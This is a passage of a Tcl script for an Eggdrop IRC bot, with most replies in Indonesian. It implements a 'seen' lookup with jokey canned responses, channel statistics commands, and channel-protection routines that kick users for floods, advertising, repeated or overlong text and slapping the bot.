    if {![string match "*c*" [getchanmode $chan]]} { puthlp "$target :[lgrnd] $output" } { puthlp "$target :$nick: [netext [uncolor $output]]" }
    return $bs(logqueries)
  }
  set data [bs_filt [netext [string trimright [lindex $args 0] ?!.,]]]
  if {[string tolower $nick] == [string tolower $data]} { seenself $nick $uhost $hand $chan ; return $bs(logqueries) }
  if {[string tolower $data] == [string tolower $botnick]} { seenme $nick $uhost $hand $chan ; return $bs(logqueries) }
  if {[onchan $data $chan]} { if {![string match "*c*" [getchanmode $chan]]} { puthlp "$target :[lgrnd]14 $data ada disini." } { puthlp "$target :$nick: [uncolor $data] ada disini." } ; return $bs(logqueries) }
  set output [bs_output $chan $nick $data $no]
  if {$output == 0} {return 0}
  if {[lrange [split $output] 1 4] == "$botnick gak pernah ketemu."} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
  regsub -all -- ~ $output "" output
  if {![string match "*c*" [getchanmode $chan]]} { puthlp "$target :[lgrnd] $output" } { puthlp "$target :$nick: [netext [uncolor $output]]" }
  return $bs(logqueries)
}
proc randomline {text} { return [lindex $text [rand [llength $text]]] }
proc seenself {nick uhost hand chan} { 
  global botnick seenself
  set outmsg [randomline $seenself(comments)] ; regsub -all {\$botnick} $outmsg $botnick outmsg ; regsub -all {\$nick} $outmsg $nick outmsg
  regsub -all {\\001} $outmsg \001 outmsg ; regsub -all {\\002} $outmsg \002 outmsg ; putserv "privmsg $chan :$outmsg"
}
proc seenme {nick uhost hand chan} { 
  global botnick seenme
  set outmsg [randomline $seenme(comments)] ; regsub -all {\$botnick} $outmsg $botnick outmsg ; regsub -all {\$nick} $outmsg $nick outmsg
  regsub -all {\\001} $outmsg \001 outmsg ; regsub -all {\\002} $outmsg \002 outmsg ; putserv "privmsg $chan :$outmsg"
}
set seenme(comments) {
  {$nick, $botnick is here!!}
  {you found me $nick :D}
  {$nick, too bright for ur eyes ha !?}
  {$nick, what ?}
  {$nick, ya ?}
  {$nick, yo wuzz up!}
  {$nick, kick niy !!}
  {\001ACTION slaps $nick with a machine-gun. Open ur eyes!\001}
  {\001ACTION ignore $nick *\001}
  {\001ACTION cuekin $nick *\001}
  {\001ACTION slaps $nick *\001}
  {\001ACTION smackdown $nick *\001}
  {\001ACTION tabok $nick *plak*\001}
  {\001ACTION toel² $nick *\001}
  {\001ACTION keplak $nick *plak*\001}
  {\001ACTION sundut $nick *\001}
  {\001ACTION tendang $nick *\001}
  {are you blind $nick ?}
  {$nick pasti ga tau kl $botnick bot :p}
  {im here $nick..}
  {$nick, Try to look at the nicklist again.}
  {is there something in ur eyes $nick ?}
  {$nick, type /msg $botnick hai}
  {$nick, type /w $botnick}
  {$nick, kamu buta ya ?}
  {$nick, apaan ?}
  {$nick brisik!!}
  {$nick pasti kangen nyariin $botnick :*}
  {nyariin $botnick emang $nick dah sanggup bayar utangnya ?}
  {$nick <-- penggemar $botnick :D}
  {\001ACTION slap $nick with a machine-gun. Open ur eyes!\001}
  {\001ACTION tabokin $nick pake sandal jepit, Melek !!\001}
  {\001ACTION kasih $nick kacamata *\001}
  {\001ACTION kasih $nick teleskop *\001}
  {\001ACTION kasih kaca mata ke $nick *\001}
  {\001ACTION give $nick a telescope\001}
  {\001ACTION sets mode: +b $nick *\001}
  {\001ACTION give $nick a glasses *\001}
  {\001ACTION cemplungin $nick ke sumur *\001}
  {\001ACTION timpuk $nick *BleTaXs!*\001}
}
set seenself(comments) {
  {Do you have multiple personality problem $nick ?}
  {$nick, Have you seen the mirror lately ?}
  {$nick, elo nyariin sapa ?? ngaca dong !}
  {$nick, sepertinya $nick sedang mengalami krisis identitas :D}
  {$nick, kamu kan ada disini sekarang!}
  {$nick, i havent seen $nick. Do you ?}
  {$nick, nick $nick is too ugly, my seen system doesnt save those kinda nick :p}
  {$nick, Found ya !!}
  {$nick, kasian ga ada yang nyariin ya ?}
  {$nick, Looking for ur self ?}
  {$nick, Loose ur self, or should i said lost ?}
  {$nick, Shut Up!}
  {$nick, seen who ?}
  {$nick, Have you taken your medication today?}
  {$nick Go look in the mirror}
  {$nick pulang dari salon ya ?}
  {muke loe di taruh dimane $nick?}
  {\001ACTION slap $nick around a bit with a large Monitor, WAke UP!!\001}
  {\001ACTION kasih cermin ke $nick *\001}
  {\001ACTION give $nick a mirror *\001}
}
proc bs_output {chan nick data no} {
  global botnick bs version bs_list
  set data [netext [string trimright [lindex $data 0] ?!.,]]
  if {$data == ""} {return 0}
  if {[string tolower $nick] == $data} {return [concat $nick, coba liat kekaca.]}
  if {$data == [string tolower $botnick]} {return [concat $botnick disini. Buang? waktu aja!]}
  if {[string length $data] > $bs(nicksize)} {return 0} 
  if {$bs(smartsearch) != 1} {set no 1}
  if {$no == 0} {
    set matches ""
    set hand ""
    set addy ""
    if {[lsearch -exact [array names bs_list] $data] != "-1"} { 
      set addy [lindex $bs_list([string tolower $data]) 1] 
      set hand [finduser $addy]
      foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
    }
    if {[validuser $data]} {set hand $data}
    if {$hand != "*" && $hand != ""} {
      if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
      foreach addr $hosts { foreach item [string tolower [bs_seenmask dcc ? $addr]] { if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]} } }
    }
    if {$matches != ""} {
      set matches [string trimleft $matches " "]
      set len [llength $matches]
      if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
      if {$len > 999} {return [concat $botnick nemuin14 $len nick sesuai permintaan, silahkan cari sendiri yg lo mau. $botnick capek!!]}
      set matches [bs_sort $matches]
      set key [lindex $matches 0]
      if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
      if {$len <= 5} {
        set output [concat ada14 $len data yang paling mendekati : [join $matches].]
        set output [concat $output [bs_search $chan $key]]
        return $output
        } {
        set output [concat $botnick nemuin14 $len nick sesuai permintaan (secara urut): [join [lrange $matches 0 4]].]
        set output [concat $output [bs_search $chan $key]]
        return $output
  } } }
  set temp [bs_search $chan $data]
  if {$temp != 0} { return $temp } { if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} { return "$botnick gak pernah liat14 $data"
      } {
      set seen [getuser $data laston]
      if {[getuser $data laston] == ""} {return "$botnick gak pernah liat $data"}
      if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} { set chan "-secret-" } { set chan [lindex $seen 1] }
      return [concat 14 $data keliatan di 14[string trimleft $chan "#"] [bs_when [lindex $seen 0]] yg lalu.]
} } }
proc bs_search {chan n} {
  global bs_list botnick ; if {![info exists bs_list]} {return 0}
  if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} { 
    set data [split $bs_list([netext [string trimright [string tolower $n] ?!.,]])]
    set n [join [lindex $data 0]] ; set addy [lindex $data 1] ; set time [lindex $data 2] ; set marker 0
    if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} { set chan "-secret-" } { set chan [lindex $data 4] }
    switch -- [lindex $data 3] {
      part { set reason [lrange $data 5 e] ; if {$reason == ""} {set reason "."} {set reason " dgn pesan \"$reason\"."} ; set output [concat 14$n ($addy) keliatan keluar dari 14[string trimleft $chan "#"] [bs_when $time] yg lalu$reason] }
      quit { set output [concat 14$n ($addy) keliatan keluar dari 14[string trimleft $chan "#"] [bs_when $time] yg lalu dgn pesan ([join [lrange $data 5 e]]).] }
      kick { set output [concat 14$n ($addy) dikick oleh14 [lindex $data 5] dari 14[string trimleft $chan "#"] [bs_when $time] yg lalu dgn alasan ([join [lrange $data 6 e]]).] }
      rnck { set output [concat 14$n ($addy) keliatan ganti nick14 [lindex $data 5] di 14[string trimleft [lindex $data 4] "#"] [bs_when $time] yg lalu.] ; if {[validchan [lindex $data 4]]} { if {[onchan $n [lindex $data 4]]} { set output [concat $output 14$n masih disana!] } { set output [concat $output $botnick gak liat14 $n sekarang.] } } }
      nick { set output [concat 14$n ($addy) keliatan ganti nick14 [lindex $data 5] di 14[string trimleft [lindex $data 4] "#"] [bs_when $time] yg lalu.] }
      splt { set output [concat 14$n ($addy) keliatan keluar 14[string trimleft $chan "#"] coz split [bs_when $time] yg lalu.] }
      rejn { set output [concat 14$n ($addy) keliatan masuk kembali di 14[string trimleft $chan "#"] setelah split [bs_when $time] yg lalu.] ; if {[validchan $chan]} {if {[onchan $n $chan]} {set output [concat $output 14$n masih di 14[string trimleft $chan "#"].]} {set output [concat $output $botnick gak liat14 $n di 14[string trimleft $chan "#"] sekarang.]}} }
      join { set output [concat 14$n ($addy) keliatan masuk 14[string trimleft $chan "#"] [bs_when $time] yg lalu.] ; if {[validchan $chan]} {if {[onchan $n $chan]} {set output [concat $output 14$n masih di 14[string trimleft $chan "#"].]} {set output [concat $output $botnick gak liat14 $n di 14[string trimleft $chan "#"] sekarang.]}} }
      away { set reason [lrange $data 5 e] ; if {$reason == ""} { set output [concat 14$n ($addy) keliatan masuk di partyline14 $chan [bs_when $time] yg lalu.] } { set output [concat 14$n ($addy) keliatan lagi away ($reason) di14 $chan [bs_when $time] yg lalu.] } }
      chon { set output [concat 14$n ($addy) keliatan masuk partyline [bs_when $time] yg lalu.] ; set lnick [string tolower $n] ; foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  $n didalam pastyline sekarang.] ; set marker 1 ; break}} ; if {$marker == 0} {set output [concat $output $botnick gak liat $n didalam partyline sekarang.]} }
      chof { set output [concat 14$n ($addy) keliatan keluar partyline [bs_when $time] yg lalu.] ; set lnick [string tolower $n] ; foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  14$n masih didalam partyline [lindex $item 1] still.] ; break}} }
      chjn { set output [concat 14$n ($addy) keliatan masuk partyline di14 $chan [bs_when $time] yg lalu.] ; set lnick [string tolower $n] ; foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  14$n masih didalam partyline sekarang.] ; set marker 1 ; break}} ; if {$marker == 0} {set output [concat $output $botnick gak liat14 $n didalam partyline sekarang.]} }
      chpt { set output [concat 14$n ($addy) keliatan keluar pertyline dari14 $chan [bs_when $time] yg lalu.] ; set lnick [string tolower $n] ; foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  14$n masih didalam partyline [lindex $item 1] still.] ; break}} }
      default {set output "error"}
    } ; return $output
  } {return 0}
}
proc bs_when {lasttime} {
  set bsyears 0
  set bsdays 0
  set bshours 0
  set bsmins 0
  set time [expr [unixtime] - $lasttime]
  if {$time < 60} {return "$time detik"}
  if {$time >= 31536000} { set bsyears [expr int([expr $time/31536000])] ; set time [expr $time - [expr 31536000*$bsyears]] }
  if {$time >= 86400} { set bsdays [expr int([expr $time/86400])] ; set time [expr $time - [expr 86400*$bsdays]] }
  if {$time >= 3600} { set bshours [expr int([expr $time/3600])] ; set time [expr $time - [expr 3600*$bshours]] }
  if {$time >= 60} { set bsmins [expr int([expr $time/60])] }
  if {$bsyears == 0} { set output "" } elseif {$bsyears == 1} { set output "1 tahun," } { set output "$bsyears tahun," }
  if {$bsdays == 1} {lappend output "1 hari,"} elseif {$bsdays > 1} {lappend output "$bsdays hari,"}
  if {$bshours == 1} {lappend output "1 jam,"} elseif {$bshours > 1} {lappend output "$bshours jam,"}
  if {$bsmins == 1} {lappend output "1 menit"} elseif {$bsmins > 1} {lappend output "$bsmins menit"}
  return [string trimright [join $output] ", "]
}
proc bs_add {nick data} {
  global bs_list bs
  if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
  set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}
proc bs_lsortcmd {a b} {global bs_list ; set a [lindex $bs_list([string tolower $a]) 2] ; set b [lindex $bs_list([string tolower $b]) 2] ; if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}}
proc bs_trim {min h d m y} {
  global bs bs_list
  if {![info exists bs_list] || ![array exists bs_list]} {return} 
  set list [array names bs_list]
  set range [expr [llength $list] - $bs(limit) - 1] 
  if {$range < 0} {return}
  set list [lsort -increasing -command bs_lsortcmd $list]
  foreach item [lrange $list 0 $range] {unset bs_list($item)}
}
proc bs_seenmask {ch nick args} {
  global bs_list bs notc botnick
  set matches "" ; set temp "" ; set i 0 ; set args [join $args] ; set chan [lindex $args 1] ; if {$chan != "" && [string trimleft $chan #] != $chan} { if {![validchan $chan]} {return "$botnick ga di 14[string trimleft $chan "#"]."} {set chan [string tolower $chan]} } { set chan "" }
  if {![info exists bs_list]} {return "Tidak ada persamaan ditemukan."} 
  set data [bs_filt [netext [string trimright [string tolower [lindex $args 0]] ?!.,]]]
  set maskfix 1
  while $maskfix {
    set mark 1
    if [regsub -all -- \\?\\? $data ? data] {set mark 0}
    if [regsub -all -- \\*\\* $data * data] {set mark 0}
    if [regsub -all -- \\*\\? $data * data] {set mark 0}
    if [regsub -all -- \\?\\* $data * data] {set mark 0}
    if $mark {break}
  }
  set id [array startsearch bs_list]
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    if {$item == ""} {continue} 
    set i 0
    set temp ""
    set match [lindex $bs_list($item) 0] 
    set addy [lindex $bs_list($item) 1]
    if {[string match $data $item![string tolower $addy]]} { set match [bs_filt $match] ; if {$chan != ""} { if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]} } {set matches [concat $matches $match]} }
  }
  array donesearch bs_list $id
  set matches [string trim $matches " "]
  if {$nick == "?"} {return [bs_filt $matches]}
  set len [llength $matches]
  if {$len == 0} {return "Tidak ada persamaan ditemukan."}
  if {$len == 1} {return [bs_output $ch $nick $matches 1]}
  if {$len > 999} {return "$botnick nemuin14 $len nick sesuai permintaan; silahkan cari sendiri. Capek nih!"}
  set matches [bs_sort $matches]
  if {$len <= 5} {
    set output [concat $botnick temukan14 $len nick sesuai permintaan (secara urut): [join $matches].]
  } { set output "$botnick temukan14 $len nick sesuai permintaan. Ini14 5 nick terakhir (secara urut): [join [lrange $matches 0 4]]." }
  return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
}
proc bs_sort {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}
proc bs_dccstats {hand idx args} {putdcc $idx "[bs_stats]"; return 1}
proc bs_pubstats {nick uhost hand chan args} {
  global bs ; if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1)} {return 0}
  if {[lsearch -exact $bs(quiet_chan) [string tolower $chan]] >= 0} {set target "notice $nick"} {set target "NOTICE $nick"} ; puthelp "$target :[bs_stats]" ; return 1
}
proc bs_msgstats {nick uhost hand args} {global bs ; if {[bs_flood $nick $uhost]} {return 0} ; puthelp "notice $nick :[bs_stats]" ; return $bs(logqueries)}
proc bs_stats {} {
  global bs_list bs botnick ; set id [array startsearch bs_list] ; set bs_record [unixtime] ; set totalm 0 ; set temp ""
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    set tok [lindex $bs_list($item) 2] ; if {$tok == ""} {putlog "Damaged seen record: $item" ; continue}
    if {[lindex $bs_list($item) 2] < $bs_record} {set bs_record [lindex $bs_list($item) 2] ; set name $item}
    set addy [string tolower [maskhost [lindex $bs_list($item) 1]]] ; if {[lsearch -exact $temp $addy] == -1} {incr totalm ; lappend temp $addy}
  }
  array donesearch bs_list $id
  return "Sampai saat ini $botnick mencatat14 [array size bs_list]/$bs(limit) nick, yang terdiri dari14 $totalm unique uhosts. Data paling lama adalah14 [lindex $bs_list($name) 0]'s, tercatat [bs_when $bs_record] yg lalu."
}
proc bs_dccchanstats {hand idx args} {
  if {$args == "{}"} {set args [console $idx]}  
  if {[lindex $args 0] == "*"} {putdcc $idx "$hand, chanstats requires a channel arg, or a valid console channel." ; return 1}
  putdcc $idx "[bs_chanstats [lindex $args 0]]"
  return 1
}
proc bs_pubchanstats {nick uhost hand chan args} {
  global bs notc ;  if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  set chantarget $chan
  if {$args == "{}"} { set chan $chan } { set chan [lindex $args 0] }
  if {[string first # $chan] != 0} { set chan "#$chan" }
  set chan [string tolower $chan]
  if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) $chan] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1)} {return 0}
  if {[lsearch -exact $bs(quiet_chan) $chan] >= 0} {set target "notice $nick"} {set target "NOTICE $nicktarget"}
  if {[lindex $args 0] != ""} {set chan [lindex $args 0]} ; puthelp "$target :[bs_chanstats $chan]" ; return $bs(logqueries)
}
proc bs_msgchanstats {nick uhost hand args} {global bs ; if {[bs_flood $nick $uhost]} {return 0} ; puthelp "notice $nick :[bs_chanstats [lindex $args 0]]" ; return $bs(logqueries)}
proc bs_chanstats {chan} {
  global bs_list ; set chan [string tolower $chan] ; if {![validchan $chan]} {return "I'm not on $chan."}
  set id [array startsearch bs_list] ; set bs_record [unixtime] ; set totalc 0 ; set totalm 0 ; set temp ""
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id] ; set time [lindex $bs_list($item) 2] ; if {$time == ""} {continue}
    if {$chan == [string tolower [lindex $bs_list($item) 4]]} {
      if {$time < $bs_record} {set bs_record $time} ; incr totalc
      set addy [string tolower [maskhost [lindex $bs_list($item) 1]]]
      if {[lsearch -exact $temp $addy] == -1} {incr totalm ; lappend temp $addy}
  } }
  array donesearch bs_list $id ; set total [array size bs_list]
  return "14[string trimleft $chan "#"] menggunakan14 [expr 100*$totalc/$total]% ($totalc/$total) dari seen database. Tercatat ada14 $totalm unique uhost sejak [bs_when $bs_record] terakhir."
}
foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
proc bs_join_botidle {nick uhost hand chan} { global bs_botidle botnick ; if {$nick == $botnick} { set bs_botidle([string tolower $chan]) [unixtime] } }
proc lastspoke {nick uhost hand chan args} {
  global bs botnick bs_botidle ; if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  set chan [string tolower $chan] ; if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) $chan] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) $chan] == -1)} {return 0}
  if {[lsearch -exact $bs(quiet_chan) $chan] >= 0} {set target "notice $nick"} {set target "NOTICE $nick"}
  set data [lindex [bs_filt [join $args]] 0]
  set ldata [string tolower $data] 
  if {[string match *\** $data]} {
    set chanlist [string tolower [chanlist $chan]]
    if {[lsearch -glob $chanlist $ldata] > -1} {set data [lindex [chanlist $chan] [lsearch -glob $chanlist $ldata]]}
  }
  if {[onchan $data $chan]} { 
    if {$ldata == [string tolower $botnick]} {puthelp "$target :$nick, buang? waktu aja :p" ; return 1}
    set time [getchanidle $data $chan] ; set bottime [expr ([unixtime] - $bs_botidle($chan))/60]
    if {$time < $bottime} {
      if {$time > 0} {set diftime [bs_when [expr [unixtime] - $time*60 -15]]} {set diftime "kurang dari semenit"}
      puthelp "$target :14$data terakhir bicara di 14[string trimleft $chan "#"] $diftime yang lalu."
      } {
      set diftime [bs_when $bs_botidle($chan)]
      puthelp "$target :$data terakhir bicara di 14[string trimleft $chan "#"] $diftime yang lalu."
  } }
  return 1
} 
proc bs_help_msg_seen {nick uhost hand args} {
  global bs ; if {[bs_flood $nick $uhost]} {return 0}
  puthelp "notice $nick :###  seen <query> \[chan\]          $bs(version)"
  puthelp "notice $nick :   Queries can be in the following formats:"
  puthelp "notice $nick :     'regular':  seen lamer; seen lamest "
  puthelp "notice $nick :     'masked':   seen *l?mer*; seen *.lame.com; seen *.edu #mychan" ; return 0
}
proc bs_help_msg_chanstats {nick uhost hand args} {
  global bs ; if {[bs_flood $nick $uhost]} {return 0}
  puthelp "notice $nick :###  chanstats <chan>          $bs(version)"
  puthelp "notice $nick :   Returns the usage statistics of #chan in the seen database." ; return 0
}
proc bs_help_msg_seenstats {nick uhost hand args} {
  global bs ; if {[bs_flood $nick $uhost]} {return 0}
  puthelp "notice $nick :###  seenstats          $bs(version)"
  puthelp "notice $nick :   Returns the status of the bseen database." ; return 0
}
proc bs_version {hand idx args} {global bs ; putidx $idx "###  Bass's Seen script, $bs(version)."}
proc bs_help_dcc {hand idx args} {
  global bs
  switch -- $args {
    seen {
      putidx $idx "###  seen <query> \[chan\]          $bs(version)" ; putidx $idx "   Queries can be in the following formats:"
      putidx $idx "     'regular':  seen lamer; seen lamest " ; putidx $idx "     'masked':   seen *l?mer*; seen *.lame.com; seen *.edu #mychan"
    }
    seennick {putidx $idx "###  seen <nick>          $bs(version)"}
    chanstats {putidx $idx "###  chanstats <chan>" ; putidx $idx "   Returns the usage statistics of #chan in the seen database."}
    seenstats {putidx $idx "###  seenstats          $bs(version)" ; putidx $idx "   Returns the status of the bseen database."}
    unseen {if {[matchattr $hand n]} {putidx $idx "###  unseen <chan>          $bs(version)" ; putidx $idx "   Deletes all <chan> entries from the bseen database."}}
    default {*dcc:help $hand $idx [join $args] ; return 0} 
  } ; return 1
}
## bseen update
bind dcc n|- unseen bs_unseen
bind pub n|- !unseen bs_pubunseen
proc bs_unseen {hand idx args} {
  global bs_list
  set tot 0 ; set chan [string tolower [lindex $args 0]] ; set id [array startsearch bs_list]
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    if {$chan == [string tolower [lindex $bs_list($item) 4]]} {incr tot ; lappend remlist $item}
  }
  array donesearch bs_list $id ; if {$tot > 0} {foreach item $remlist {unset bs_list($item)}}
  putlog "$hand removed $chan from the bseen database.  $tot entries removed."
  putidx $idx "$chan successfully removed.  $tot entries deleted from the bseen database."
}
proc bs_pubunseen {nick uhost hand chan args} {
  global bs_list notc
  set tot 0 ; set targetch $chan
  if {$args == "{}"} { set chan $chan } { set chan [lindex $args 0] }
  if {[string first # $chan] != 0} { set chan "#$chan" }
  if {![validchan $chan]} { puthlp "NOTICE $nick :$notc NoT IN $chan" ; return 0 }
  set id [array startsearch bs_list]
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    if {$chan == [string tolower [lindex $bs_list($item) 4]]} {incr tot ; lappend remlist $item}
  }
  array donesearch bs_list $id ; if {$tot > 0} {foreach item $remlist {unset bs_list($item)}}
  putquick "PRIVMSG $targetch :05$tot data dihapus dari database channel 14[string trimleft $chan "#"]."
}
bind dcc -|- seen bs_dccreq1
bind dcc -|- seennick bs_dccreq2
proc bs_dccreq1 {hand idx args} {bs_dccreq $hand $idx $args 0}
proc bs_dccreq2 {hand idx args} {bs_dccreq $hand $idx $args 1}
proc bs_dccreq {hand idx args no} {
  set args [bs_filt [join $args]] ; global bs
  if {[string match *\\\** [lindex $args 0]]} {
    set output [bs_seenmask dcc $hand $args]
    if {$output == "No matches were found."} {putallbots "bs_botsearch 0 $idx $hand $args"}
    if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 0 $idx $hand $args"}
    putdcc $idx $output ; return $bs(logqueries)
  }
  set search [bs_filt [lindex $args 0]]
  set output [bs_output dcc $hand $search $no]
  if {$output == 0} {return 0}
  if {[lrange [split $output] 1 4] == "I don't remember seeing"} {putallbots "bs_botsearch 0 $idx $hand $args"}
  putdcc $idx "$output" ; return $bs(logqueries)
}
## seen.tcl lastseen

bind pubm - * repeat_pubm
bind ctcp - ACTION action_chk
proc action_chk {nick host hand chan keyword arg} {
  global botnick
  if {$nick == $botnick || [string match "*SeT FoR*" $arg]} { return 0 }
  if {![validchan $chan]} { if {[matchattr $nick Z]} { set arg "`$arg" ; msg_prot $nick $host $hand $arg } { msg_prot $nick $host $hand $arg } } { if {[matchattr $nick Z]} { set arg "@$arg" ; repeat_pubm $nick $host $hand $chan $arg } { repeat_pubm $nick $host $hand $chan $arg } } }
proc repeat_pubm {nick uhost hand chan text} {
  global repeat_last botnick notb notc kops alw owner ismaskhost is_m
  global botnick capsnick deopme repeat_person quick bannick notm advwords
  regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
  regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
  regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
  pub_Z $nick $uhost $hand $chan $text
  set cflag "c$chan" ; set cflag [string range $cflag 0 8]
  set real $text ; set text [uncolor $text]
  if {$nick == "ChanServ"} { if {[string match "*has deopped $botnick*" $text]} { if {![matchattr [lindex $text 0] f]} { if {[matchattr $cflag D]} { set deopme [lindex $text 0] } } } ; return 0 }
  if {[matchattr $nick f] || $nick == $botnick} { return 0 }
  set mhost "@[lindex [split $uhost @] 1]"
  set resume "T"
  if {[string match "*-greet*" [channel info $chan]]} { set resume "F" }
  if {![isop $botnick $chan]} { set resume "F" }
  if {![info exists kops]} { if {[isop $nick $chan]} { set resume "F" } 
      if {[isvoice $nick $chan]} { set resume "F" } }
   if {[string tolower [lindex $text 0]] == "slaps"} {
      if {$resume == "F"} { return 0 }
      if {[lindex $text 1] == $botnick} {
         putserv "PRIVMSG $chan :\001ACTION slaps $nick around a bit with a large trout"
         putserv "KICK $chan $nick :$notc 14SeLF 4SLaPS 1PRoTECTION!!"
         return 0
      }
      if {[matchattr [lindex $text 1] n]} {
         
         putserv "KICK $chan $nick :$notc 14DoNT 4SLaPS1 my ADmIN!!"
         return 0
      }
      if {[matchattr [lindex $text 1] f]} {
         putserv "KICK $chan $nick :$notc 14DoNT 4SLaPS1 my FrieNd!!"
         return 0
      }
      if {[matchattr [lindex $text 1] m]} {
         putserv "KICK $chan $nick :$notc 14DoNT 4SLaPS1 my MaSTER!!"
      }
      return 0
   }
  # Tsunami Flood PRoTECTION
  if {[string length $text] > 100} {
    set chr 0
    set cnt 0
    while {$cnt < [string length $real]} { if [isflood [string index $real $cnt]] { incr chr } ; incr cnt }
    if {$chr > 30} {
      if {$resume == "T"} {
        set bannick($nick) "$mhost"
putlog "tsunami from $nick $mhost in $chan"
        if {![isutimer "TsunamI $chan"]} { utimer 30 [list putlog "TsunamI $chan"] } elseif {[info exists ismaskhost]} { set bannick($nick) [maskhost "$mhost"] }
        if {$quick == "1" && ![info exists is_m($chan)]} { putsrv "KICK $chan $nick :[lgrnd] 4!14tsunami4! 14abusing 4messages [banmsg]" } { putserv "KICK $chan $nick :$notm 4!14tsunami4! 14abusing 4messages [banmsg]" }
      }
      return 0
  } }
  if {![info exists kops]} { if {$resume == "F"} { return 0 } }
  if {[string match "*!seen [string tolower $nick]*" [string tolower $text]]} { putsrv "KICK $chan $nick :[lgrnd] 4!14lamer4! 14go look in a 4mirror [banmsg]" ; return 0 }
  if {[string match "*#*" $text] && ![string match "*##*" $text] && ![string match "*# *" $text]} {
    foreach x [channels] { set chksiton [string tolower $x] ; if {[string match "*$chksiton*" [string tolower $text]]} { return } }
    foreach seekchan $text { if {[string match "*#*" $seekchan]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :[lgrnd] 4!14spam4! 14dønt 4invited14 match frøm 4$seekchan [banmsg]" } } 
  }
  foreach advword [string tolower $advwords] {
    if {[string match *$advword* [string tolower $text]]} {
      if {[string match "*dal.net*" $text] || [string match "*wwww*" $text] || [string match "*www..*" $text] || [string match "*dns*" $text] || [string match "!info *" $text] || [string match "!ip *" $text] || [string match "*seen*" $text] || [string match "*port*" $text] || [string match "*whois*" $text]} { return 0 }
      set bannick($nick) "$uhost"
      putsrv "KICK $chan $nick :[lgrnd] 4!14spam4! 14dønt 4advertise14 in 4[string trimleft $chan "#"] 14match frøm 4$advword [banmsg]"
      return 0
  } }
  if {[matchattr $cflag R]} {
    if {[info exists repeat_last($mhost$chan)]} {
      if {[string tolower $repeat_last($mhost$chan)] == [string tolower $text]} {
        if {![info exists repeat_person($mhost$chan)]} { set repeat_person($mhost$chan) 1 } { incr repeat_person($mhost$chan) }
        if {$repeat_person($mhost$chan) == [getuser $cflag XTRA "RPT"] && ![isop $nick $chan] && ![isvoice $nick $chan]}  {
          set bannick($nick) "$uhost"
          putserv "KICK $chan $nick :$notc 14autøki4çk4 text repeat deteçted frøm 4$mhost 14max4 [getuser $cflag XTRA "RPT"] [banmsg]"
          catch {unset repeat_person($mhost$chan)}
          catch {unset repeat_last($mhost$chan)}
          return 0
    } } }
    set repeat_last($mhost$chan) $text
  }
  if {[matchattr $cflag T] && [string length $real] >= [getuser $cflag XTRA "CHAR"]} {
    catch {unset repeat_person($mhost$chan)}
    catch {unset repeat_last($mhost$chan)}
    set bannick($nick) "$uhost"
    if {![isutimer "OL $chan"]} {
      utimer 10 [list putlog "OL $chan"] 
      putsrv "KICK $chan $nick :[lgrnd] 4!14spam4! 14abusing 4long text 14max4 [getuser $cflag XTRA "CHAR"]14 char [banmsg]"
    } { putsrv "KICK $chan $nick :[lgrnd] 4!14spam4! 14abusing 4long text 14max4 [getuser $cflag XTRA "CHAR"]14 char [banmsg]" }
    return 0
  }
  if {[matchattr $cflag U]} {
    set len [string length $text]
    if {[isbad $nick $uhost $chan $text]} { return 0 }
    if {$len < 30} { return 0 }
    set cnt 0
    set capcnt 0
